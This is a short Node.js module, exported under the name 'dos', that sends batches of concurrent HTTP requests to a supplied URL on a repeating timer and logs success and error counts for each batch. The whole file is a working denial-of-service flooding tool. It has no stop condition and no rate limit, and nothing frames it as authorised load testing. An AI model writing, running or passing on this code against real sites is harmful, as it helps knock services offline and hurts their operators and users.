const request = require('request');

const dos = (url, qty, ms, options = {}, callback) => {
    let counter = 1;

    const sendRequests = async () => {
        let err = 0, ok = 0;
        const startTime = new Date();

        const promises = Array.from({ length: qty }, () => {
            return new Promise((resolve) => {
                request({ url, ...options }, (error, response) => {
                    if (error) {
                        err++;
                        console.error(`Error: ${error.message}`);
                    } else {
                        ok++;
                    }
                    resolve();
                });
            });
        });

        await Promise.all(promises);

        const endTime = new Date();
        console.log(`[${startTime.toISOString()} - ${endTime.toISOString()}] Batch ${counter}: ${url} OK: ${ok} ERR: ${err}`);

        if (callback) {
            callback(ok, err);
        }

        counter++;
    };

    setInterval(sendRequests, ms);
};

module.exports = dos;
